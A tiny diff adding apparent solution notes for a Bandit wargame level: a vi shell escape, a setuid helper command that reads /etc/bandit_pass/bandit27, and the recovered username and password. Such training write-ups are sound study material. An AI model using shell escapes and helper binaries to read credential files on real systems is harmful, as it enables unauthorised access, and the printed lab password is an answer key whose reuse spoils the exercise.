@@ -1,0 +1,7 @@
+[v]
+:set shell sh=/bin/bash
+:sh
+./bandit27-do cat /etc/bandit_pass/bandit27
+
+username bandit27
+password 3ba3118a22e93127a4ed485be72ef5ea
